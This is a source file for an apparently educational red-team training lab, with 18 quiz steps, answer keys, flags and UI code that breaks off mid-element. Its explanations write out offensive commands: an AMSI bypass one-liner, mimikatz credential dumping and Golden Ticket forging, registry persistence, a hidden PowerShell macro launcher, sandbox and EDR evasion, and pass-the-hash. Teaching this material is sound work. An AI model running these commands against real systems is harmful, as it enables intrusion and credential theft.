'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#ff3333'
const moduleId = 'red-team'
const moduleName = 'Red Team Operations'
const moduleNum = '11'
const xpTotal = 485

const steps: LabStep[] = [
  {
    id: 'redteam-01',
    title: 'C2 Framework Selection',
    objective: 'A red team needs a Command & Control framework for persistent access. Name one modern C2 framework used in professional red team engagements.',
    hint: 'Popular choices: Cobalt Strike, Sliver, Havoc, Brute Ratel C4, Metasploit.',
    answers: ['cobalt strike', 'cobaltstrike', 'sliver', 'havoc', 'brute ratel', 'metasploit', 'empire'],
    xp: 20,
    explanation: 'Professional C2 frameworks provide: beacon/implant management, post-exploitation modules, team collaboration, malleable C2 profiles (traffic obfuscation). Sliver and Havoc are open-source alternatives to the expensive Cobalt Strike. Always use in authorized engagements only.'
  },
  {
    id: 'redteam-02',
    title: 'Living off the Land',
    objective: 'Living-off-the-Land (LotL) attacks use built-in OS tools to avoid detection. What Windows built-in tool can download files and execute code, commonly abused by attackers?',
    hint: 'A Windows scripting host - either powershell, wscript, or mshta are all valid.',
    answers: ['powershell', 'mshta', 'wscript', 'certutil', 'rundll32', 'regsvr32', 'bitsadmin'],
    xp: 25,
    explanation: 'LotL techniques use legitimate binaries (LOLBins): PowerShell, certutil, mshta, regsvr32, wscript. They bypass application whitelisting since these are trusted OS components. Detection relies on behavioral analytics - a certutil.exe downloading an EXE is suspicious regardless of the tool being legitimate.'
  },
  {
    id: 'redteam-03',
    title: 'OPSEC: Traffic Blending',
    objective: 'Red team OPSEC requires C2 traffic to look like legitimate traffic. What Cobalt Strike feature makes beacon traffic mimic real applications?',
    hint: 'The feature is called "Malleable C2 Profiles" - it shapes the traffic to look like specific apps.',
    answers: ['malleable c2', 'malleable c2 profiles', 'c2 profiles', 'malleable profiles'],
    flag: 'FLAG{c2_opsec_mastered}',
    xp: 30,
    explanation: 'Malleable C2 Profiles define how beacon traffic looks: HTTP headers, URIs, user-agent strings, sleep jitter. A profile can make beacon traffic look identical to Microsoft Teams or Amazon S3 traffic. Available profiles at github.com/rsmudge/Malleable-C2-Profiles.'
  },
  {
    id: 'redteam-04',
    title: 'Lateral Movement: WMI',
    objective: 'WMI (Windows Management Instrumentation) is commonly used for lateral movement. What command-line tool natively executes commands on remote Windows systems via WMI?',
    hint: 'The tool is built into Windows: wmic or impacket-wmiexec from Linux.',
    answers: ['wmic', 'wmiexec', 'impacket-wmiexec', 'wmi', 'wmiexec.py'],
    xp: 25,
    explanation: 'wmic /node:target_ip process call create "cmd.exe /c command" executes commands via WMI - no service installation required, less noisy than psexec. From Linux: impacket-wmiexec domain/user:password@target. WMI activity is logged in the Microsoft-Windows-WMI-Activity event log.'
  },
  {
    id: 'redteam-05',
    title: 'Persistence via Registry',
    objective: 'Establish persistence using a Windows registry Run key. What registry path runs programs at user logon for the current user?',
    hint: 'Path: HKCU (current user), then Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    answers: [
      'hkcu\\software\\microsoft\\windows\\currentversion\\run',
      'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      'hkey_current_user\\software\\microsoft\\windows\\currentversion\\run'
    ],
    flag: 'FLAG{persistence_established}',
    xp: 35,
    explanation: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run entries execute at each user logon. Set with: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\payload.exe". Detected by Autoruns (Sysinternals) and most EDR products - use with OPSEC considerations.'
  },
  {
    id: 'redteam-06',
    title: 'Process Injection',
    objective: 'Process injection hides malicious code inside a legitimate process. What Windows API call is commonly used to write shellcode into a remote process before executing it?',
    hint: 'Three API calls are used in sequence: allocate memory, write shellcode, then create a thread to execute it.',
    answers: ['WriteProcessMemory', 'VirtualAllocEx', 'CreateRemoteThread', 'NtWriteVirtualMemory'],
    xp: 25,
    explanation: 'Classic injection: VirtualAllocEx (allocate memory in target), WriteProcessMemory (write shellcode), CreateRemoteThread (execute). Process Hollowing: spawn suspended process, unmap PE, write malicious PE, resume. Reflective DLL injection: self-loading DLL, no disk artifact. Detection: unusual parent-child process relationships, cross-process memory operations flagged by EDR behavioral engines.'
  },
  {
    id: 'redteam-07',
    title: 'Token Impersonation',
    objective: 'Windows token impersonation steals privileges from a running process. What tool lists available tokens and allows you to impersonate them to escalate privileges?',
    hint: 'This is a Meterpreter module - type the module name used to list and steal tokens.',
    answers: ['incognito', 'meterpreter incognito', 'token impersonation', 'impersonate_token'],
    flag: 'FLAG{token_impersonated}',
    xp: 20,
    explanation: 'incognito (Meterpreter module) lists delegation and impersonation tokens. impersonate_token "DOMAIN\\\\Admin" steals a logged-on admin session. Requires SeImpersonatePrivilege, which is held by IIS and SQL Server service accounts - a common post-exploitation path. Modern alternative: Rubeus.exe tgtdeleg for Kerberos delegation abuse. Token theft works across sessions and does not require the target account password.'
  },
  {
    id: 'redteam-08',
    title: 'Kerberoasting',
    objective: 'Kerberoasting extracts service ticket hashes for offline cracking. What tool performs Kerberoasting and outputs hashes in hashcat format?',
    hint: 'Both a .NET Windows tool and an Impacket Linux tool are valid answers.',
    answers: ['rubeus', 'rubeus.exe kerberoast', 'impacket-GetUserSPNs', 'GetUserSPNs.py', 'invoke-kerberoast'],
    xp: 30,
    explanation: 'Rubeus.exe kerberoast /outfile:hashes.txt requests service tickets for all accounts with SPNs and outputs NT hashes. impacket-GetUserSPNs domain/user:pass -outputfile hashes.txt works from Linux without a domain-joined machine. Crack with hashcat -m 13100. Prevention: use gMSA (Group Managed Service Accounts), ensure service accounts have strong random passwords (25+ chars), audit all accounts with registered SPNs using Get-ADUser.'
  },
  {
    id: 'redteam-09',
    title: 'Credential Dumping',
    objective: 'You have SYSTEM-level access to a Windows machine. What tool dumps NTLM hashes from LSASS memory?',
    hint: 'The most well-known credential dumping tool starts with "m" and has a module called sekurlsa.',
    answers: ['mimikatz', 'mimikatz sekurlsa::logonpasswords', 'procdump', 'lsass dump'],
    xp: 25,
    explanation: 'mimikatz sekurlsa::logonpasswords dumps plaintext passwords and NT hashes from LSASS memory. Requires SeDebugPrivilege (SYSTEM or admin). Modern EDRs block direct LSASS access - alternatives include: procdump.exe -ma lsass.exe (legitimate Sysinternals binary, often allowed by AV), rundll32 comsvcs.dll MiniDump (LOLBin approach), and nanodump (kernel driver method). Transfer the dump offline and parse with pypykatz on Linux to extract credentials without touching the target again.'
  },
  {
    id: 'redteam-10',
    title: 'OPSEC - Domain Fronting',
    objective: 'Domain fronting hides C2 traffic behind a CDN. The HTTP Host header points to the real C2 while the SNI and IP target a legitimate CDN host. What does the attacker control in a domain fronting setup to route traffic to their C2 server?',
    hint: 'It is an HTTP header - the one that tells the server which virtual host to serve.',
    answers: ['host header', 'http host header', 'the host header', 'cdn host header'],
    flag: 'FLAG{opsec_advanced}',
    xp: 30,
    explanation: 'Domain fronting: TLS SNI = allowed-cdn.cloudfront.net (bypasses firewall inspection), HTTP Host header = attacker.cloudfront.net (CDN routes internally to attacker server). Most CDNs have blocked this technique. Alternative - Domain borrowing uses legitimate subdomains of trusted services. Redirectors: a VPS running socat or nginx proxies traffic to the backend C2, keeping the real C2 IP hidden. Traffic shaping with jitter, sleep intervals, and business-hours-only callbacks significantly reduces automated detection.'
  },
  {
    id: 'redteam-11',
    title: 'AMSI Bypass - Defeating PowerShell Defences',
    objective: 'AMSI (Antimalware Scan Interface) scans PowerShell scripts before execution. A common bypass patches amsi.dll in memory to always return AMSI_RESULT_CLEAN. What PowerShell technique writes a null byte to the AmsiScanBuffer function to disable scanning?',
    hint: 'The technique involves using .NET reflection to access amsiInitFailed or patching AmsiScanBuffer bytes directly.',
    answers: ['amsi bypass', 'patch amsi', 'amsi patch', 'reflection amsi', 'amsi.dll patch'],
    xp: 30,
    explanation: 'AMSI intercepts all script content before execution and sends it to registered AV products. Classic bypass (patched by most AVs): [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true). Memory patch approach: use P/Invoke to get AmsiScanBuffer address and overwrite first bytes with 0xB8,0x57,0x00,0x07,0x80,0xC3 (mov eax,0x80070057; ret - returns error). Obfuscation layers to evade AMSI signature: string concatenation, character arrays, Base64 encoding, variable substitution, insertion in strings, escape sequences. Downgrade attack: powershell -version 2 (no AMSI in v2 - requires .NET 2.0). CLM bypass: Constrained Language Mode enforcement - use runspaces or COM objects. Modern evasion: encrypt payload, decrypt in memory using XOR/AES, only amsi-visible as gibberish. Detection: ETW (Event Tracing for Windows) logs AMSI evasion attempts in modern environments.'
  },
  {
    id: 'redteam-12',
    title: 'Phishing Infrastructure and Initial Access',
    objective: 'Professional red teams use GoPhish to manage phishing campaigns. What does GoPhish provide for tracking when a target opens a phishing email?',
    hint: 'A tiny invisible image embedded in the email body that loads from the GoPhish server.',
    answers: ['tracking pixel', 'open tracking', 'email tracking', 'pixel tracker', '1x1 pixel'],
    xp: 25,
    explanation: 'GoPhish components: Sending Profiles (SMTP config), Landing Pages (credential harvest or payload delivery), Email Templates (with tracking pixel), Campaigns (links all components). Tracking pixel: 1x1 transparent GIF served from GoPhish server - loading it records IP, user-agent, timestamp. Click tracking: links redirect through GoPhish (TARGET_URL?rid=CAMPAIGN_ID) before sending to landing page. Infrastructure setup: domain with aged registration (30+ days), lookalike domain (company-helpdesk.com vs companyhelpdesk.com), MX record pointing to mail server, SPF/DKIM/DMARC configured to pass spam filters. Evilginx2: transparent reverse proxy that sits between target and real login page - captures credentials AND session cookies (bypasses MFA). Modlishka: alternative to Evilginx. Email payload delivery: macro-enabled documents (.docm), ISO files containing LNK, HTML smuggling (payload assembled in browser from Base64 chunks via JS). Payload considerations: staged (small dropper downloads main payload) vs stageless (full payload in document). Detection bypass: test against Defender sandbox before delivery.'
  },
  {
    id: 'redteam-13',
    title: 'Macro-Based Initial Access',
    objective: 'A malicious Office macro downloads and executes a payload when a document is opened. What VBA function executes an external command or binary from within a macro?',
    hint: 'A two-letter VBA built-in, or the WScript.Shell COM object method are both valid answers.',
    answers: ['shell', 'shell()', 'wscript.shell', 'createobject wscript', 'createobject("wscript.shell")'],
    flag: 'FLAG{initial_access}',
    xp: 25,
    explanation: 'Classic VBA macro: Sub AutoOpen() or Sub Document_Open() triggers on open. Shell "cmd /c powershell -nop -w hidden -enc BASE64PAYLOAD" executes command. Modern evasion: CreateObject("WScript.Shell").Run "...", 0, False (hidden window). DCOM object: GetObject("winmgmts:Win32_Process").Create "payload.exe". Sandbox evasion in macros: check username (not "SANDBOX", "MALWARE"), check computer name, check domain membership, sleep 5 minutes before running (sandbox timeout), check screen resolution (800x600 = sandbox), check running processes for analysis tools (wireshark.exe, procmon.exe). HTML smuggling (no macros needed): JS in HTML file assembles payload bytes and triggers download - bypasses email attachment scanning. Alternatives to macros: XLL add-ins (Excel), XLSB binary format, DDE (Dynamic Data Exchange - older technique), MSIX packages, ISO/VHD container (no Mark of the Web). Mark of the Web (MOTW): files downloaded from internet get Zone.Identifier ADS - Office blocks macros for MOTW files. Container files (ISO, VHD) do NOT propagate MOTW to contents - why attackers use them.'
  },
  {
    id: 'redteam-14',
    title: 'EDR Evasion - Defeating Endpoint Detection',
    objective: 'Modern EDRs hook Windows API calls by patching ntdll.dll in user-space. A technique to bypass these hooks involves loading a fresh copy of ntdll directly from disk. What is this technique called?',
    hint: 'The technique restores the original API stubs - it is called unhooking or direct syscalls.',
    answers: ['unhooking', 'ntdll unhooking', 'direct syscalls', 'syscall', 'manual syscall'],
    xp: 30,
    explanation: 'EDR hooking: EDR injects DLL into every process, patches first bytes of sensitive APIs (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx) with JMP to EDR analysis code. Bypass via unhooking: open ntdll.dll from disk (C:\\Windows\\System32\\ntdll.dll), copy .text section over the in-memory hooked copy - restoring clean syscall stubs. Direct syscalls (SysWhispers2/SysWhispers3): enumerate SSNs (System Service Numbers) at runtime, build syscall stubs that go directly to kernel without touching hooked ntdll. Hell\'s Gate: dynamically resolves SSNs from memory. Halo\'s Gate: handles hooked syscall stubs by looking at neighboring functions. Hardware breakpoints: use VEH (Vectored Exception Handler) to intercept execution at EDR hook points. Process hollowing: spawn suspended legitimate process, replace memory with malicious PE - hooks in hollowed process do not fire (process created fresh). Sleep obfuscation: encrypt beacon in memory during sleep, decrypt when active - evades memory scanner. ETW patching: patch EtwEventWrite to prevent EDR telemetry. PPID spoofing: create process with spoofed parent PID to break detection logic. Phantom DLL hollowing, module stomping: additional memory evasion. Tools: SharpBlock (ETW/AMSI), TartarusGate (syscalls), RecycledGate.'
  },
  {
    id: 'redteam-15',
    title: 'Pass-the-Hash and Pass-the-Ticket',
    objective: 'You have an NTLM hash but not the plaintext password. What Impacket tool authenticates to remote Windows systems using only the NTLM hash?',
    hint: 'The Impacket suite has several tools for this - psexec.py, wmiexec.py, and smbexec.py all work.',
    answers: ['psexec.py', 'impacket-psexec', 'wmiexec.py', 'smbexec.py', 'impacket psexec', 'pth-winexe'],
    xp: 25,
    explanation: 'Pass-the-Hash: NTLM authentication protocol sends NT hash directly - no need to crack it. impacket-psexec DOMAIN/user@target -hashes :NTLM_HASH. wmiexec.py -hashes :HASH DOMAIN/user@target (stealthier - no service creation). CrackMapExec: cme smb SUBNET -u admin -H HASH --local-auth. PtH blocked by: LocalAccountTokenFilterPolicy=0 required for remote admin, Protected Users group (Kerberos-only), Credential Guard. Pass-the-Ticket (PtT): steal Kerberos TGT or service ticket from memory. mimikatz sekurlsa::tickets /export dumps .kirbi files. mimikatz kerberos::ptt ticket.kirbi injects ticket into current session. Rubeus.exe ptt /ticket:BASE64 injects ticket. Overpass-the-Hash: convert NT hash to Kerberos TGT - mimikatz sekurlsa::pth /user:admin /domain:domain /ntlm:HASH /run:cmd.exe. This gives full Kerberos ticket vs NTLM-only. Detection: 4624 logon events with unusual workstation, RC4 tickets (should be AES), same TGT used from multiple IPs simultaneously.'
  },
  {
    id: 'redteam-16',
    title: 'Active Directory Persistence Techniques',
    objective: 'An attacker compromises the domain. To maintain long-term persistence they create a Golden Ticket. What account NTLM hash is required to forge a Golden Ticket?',
    hint: 'It is the hash of a special built-in Kerberos account in every AD domain.',
    answers: ['krbtgt', 'krbtgt hash', 'krbtgt ntlm', 'krbtgt account'],
    flag: 'FLAG{domain_persistence}',
    xp: 30,
    explanation: 'Golden Ticket = forged TGT signed with krbtgt hash. Valid for 10 years by default, works even after user account deleted, survives password changes (until krbtgt rotated twice). mimikatz: kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /krbtgt:HASH /ptt. Detection: TGT lifetime > 10 hours, missing fields, RC4 encryption when AES expected, anomalous account access. Silver Ticket: forged service ticket (TGS) signed with service account hash - no DC contact required (stealthier). Target specific services: CIFS (file shares), HOST (task scheduler), HTTP (WinRM), LDAP (AD queries). Diamond Ticket: modify legitimate TGT rather than forge - harder to detect (has legitimate PAC signature). Sapphire Ticket: copy PAC from real TGT into forged one. SID History injection: add Enterprise Admins SID to regular user\'s SID History - granted EA privileges in other domains. AdminSDHolder abuse: modify AdminSDHolder template - propagates to all protected admin accounts every 60 minutes. DSRM account: Directory Services Restore Mode local admin - reactivate for persistent local DA equivalent. Skeleton Key: mimikatz misc::skeleton patches LSASS to accept a master password "mimikatz" for ALL domain accounts (not persistent across reboot).'
  },
  {
    id: 'redteam-17',
    title: 'Red Team Reporting and Debrief',
    objective: 'A red team engagement report includes an executive summary and technical findings. What metric measures the total time from initial breach to achieving the engagement objective?',
    hint: 'It describes how long the attacker was inside before reaching their goal - also called breakout time.',
    answers: ['time to objective', 'ttp dwell time', 'dwell time', 'time to compromise', 'breakout time'],
    xp: 20,
    explanation: 'Red team report structure: 1) Executive Summary (1-2 pages - business risk, key findings, strategic recommendations, non-technical language). 2) Engagement Scope (targets, rules of engagement, out-of-scope items, timeline). 3) Attack Narrative (chronological story of the engagement - initial access to objectives). 4) Technical Findings (per-vulnerability: severity, CVSS, description, evidence, remediation). 5) Appendices (tool output, IOCs, detection recommendations). Key metrics: Time to Initial Access (how long from start to first foothold), Time to Domain Admin (escalation speed), Dwell Time (how long undetected), Number of Alerts Generated (blue team detection rate), Objectives Achieved (percentage of defined goals). MITRE ATT&CK mapping: map each technique used to ATT&CK TTP IDs - gives defenders actionable detection logic. Severity ratings: Critical (direct path to domain/cloud admin), High (significant access or data exposure), Medium (internal access or sensitive data), Low (information disclosure, hardening opportunities). Remediation prioritisation: quick wins vs strategic improvements. Retest: always offer retest after remediation to verify fixes. Debrief: technical debrief for security team (share TTPs and detections missed), executive debrief (business risk and investment recommendations).'
  },
  {
    id: 'redteam-18',
    title: 'Full Red Team Operation - TIBER-EU Methodology',
    objective: 'The TIBER-EU framework is used for threat intelligence-based red team testing of financial institutions. What phase comes between Preparation and Red Team Testing in the TIBER-EU framework?',
    hint: 'It involves profiling real threat actors targeting the sector and building realistic attack scenarios.',
    answers: ['threat intelligence', 'ti phase', 'threat intelligence phase', 'targeted threat intelligence'],
    flag: 'FLAG{red_team_complete}',
    xp: 35,
    explanation: 'TIBER-EU phases: 1) Preparation (scope, procurement, legal). 2) Threat Intelligence (threat actor profiling, attack scenarios based on real adversaries targeting the sector). 3) Red Team Test (execute scenarios from TI phase). 4) Closure (reporting, remediation tracking, attestation). Other frameworks: PTES (Penetration Testing Execution Standard) - 7 phases. OSSTMM (Open Source Security Testing Methodology Manual) - very rigorous, metric-based. CBEST (UK equivalent of TIBER-EU). Full operation phases in practice: PRE-ENGAGEMENT: scoping, NDA, rules of engagement, emergency contacts (get-out-of-jail-free letter). RECONNAISSANCE: passive (Maltego, Shodan, LinkedIn, domain intel) and active (port scanning, web crawling - must be in scope). WEAPONISATION: payload development, infrastructure setup (C2, phishing, redirect servers). DELIVERY: spearphishing, watering hole, physical (USB drop, tailgating). EXPLOITATION: CVE exploitation, credential abuse, social engineering. POST-EXPLOITATION: C2 establishment, privilege escalation, persistence. LATERAL MOVEMENT: network pivoting, credential reuse. OBJECTIVE COMPLETION: data exfil, AD compromise, physical access simulation. REPORTING: findings documentation, MITRE ATT&CK mapping. Blue team integration: purple team exercises where red and blue work together reviewing detections in real-time.'
  }
]

export default function RedTeamLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  useEffect(() => {
    const saved = localStorage.getItem('lab_red-team-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#7a1a1a' }}>
        <Link href="/" style={{ color: '#7a1a1a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/red-team" style={{ color: '#7a1a1a', textDecoration: 'none' }}>RED TEAM OPS</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/red-team" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #3a0505', borderRadius: '3px', color: '#7a1a1a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(255,51,51,0.1)', border: '1px solid rgba(255,51,51,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(255,51,51,0.04)', border: '1px solid rgba(255,51,51,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#3a0505', border: p.active ? '2px solid ' + accent : '1px solid #3a0505', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#5a1515', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#3a0505', margin: '0 2px' }}>-</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#8a4a4a' }}>
          MOD-{moduleNum} &nbsp;·&nbsp; {moduleName.toUpperCase()} &nbsp;·&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE - LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(255,51,51,0.1)', border: '1px solid rgba(255,51,51,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 - GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Red Team Operations Lab</h1>
          </div>
        </div>

        <p style={{ color: '#8a6a6a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          C2 frameworks, living-off-the-land techniques, OPSEC, lateral movement, persistence, EDR evasion, and full operation lifecycle.
          Type real commands, earn XP, and capture flags. Complete all 18 steps to unlock Phase 2.
        </p>

        <div style={{ background: 'rgba(255,51,51,0.03)', border: '1px solid rgba(255,51,51,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#3a0505', letterSpacing: '0.25em', marginBottom: '8px' }}>KEY CONCEPTS COVERED IN THIS LAB</div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
            {['C2 frameworks', 'Malleable C2 profiles', 'LOLBins / LotL', 'OPSEC tradecraft', 'WMI lateral movement', 'Registry persistence', 'EDR evasion', 'AMSI bypass', 'Phishing infra', 'Macro initial access', 'Pass-the-Hash', 'AD persistence', 'Red team reporting', 'TIBER-EU methodology'].map(c => (
              <span key={c} style={{ fontSize: '7.5px', color: '#8a4a4a', background: 'rgba(255,51,51,0.06)', border: '1px solid rgba(255,51,51,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="red-team-lab"
          moduleId={moduleId}
          title="Red Team Operations Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(255,51,51,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(255,51,51,0.4)' : '#3a0505'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#5a1515', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#8a4a4a' : '#5a1515', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 - FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#5a1515' }}>Full Red Team Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#ffb347', background: 'rgba(255,179,71,0.08)', border: '1px solid rgba(255,179,71,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(255,51,51,0.04)' : '#080202', border: '1px solid ' + (guidedDone ? 'rgba(255,51,51,0.25)' : '#1a0505'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#8a4a4a' : '#3a0505', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#5a1515', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#8a4a4a', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox for Red Team Operations
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a1515', marginBottom: '2rem', lineHeight: 1.7 }}>
              Command history &nbsp;·&nbsp; Tab autocomplete &nbsp;·&nbsp; Real command simulation &nbsp;·&nbsp; No restrictions
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['Sliver C2 framework', 'LOLBin techniques', 'WMI lateral movement', 'Registry persistence', 'EDR evasion', 'AMSI bypass', 'Phishing infrastructure', 'AD persistence'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#3a0505' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#8a4a4a' : '#3a0505' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(255,51,51,0.6)' : '#3a0505'), borderRadius: '6px', background: guidedDone ? 'rgba(255,51,51,0.12)' : 'transparent', color: guidedDone ? accent : '#3a0505', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(255,51,51,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#3a0505' }}>Complete all 18 guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#080202' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#0a0303', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#5a1515' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any red team technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #3a0505', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#5a1515', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '▼' : '▶'} QUICK REFERENCE - RED TEAM COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#080202', border: '1px solid #1a0505', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
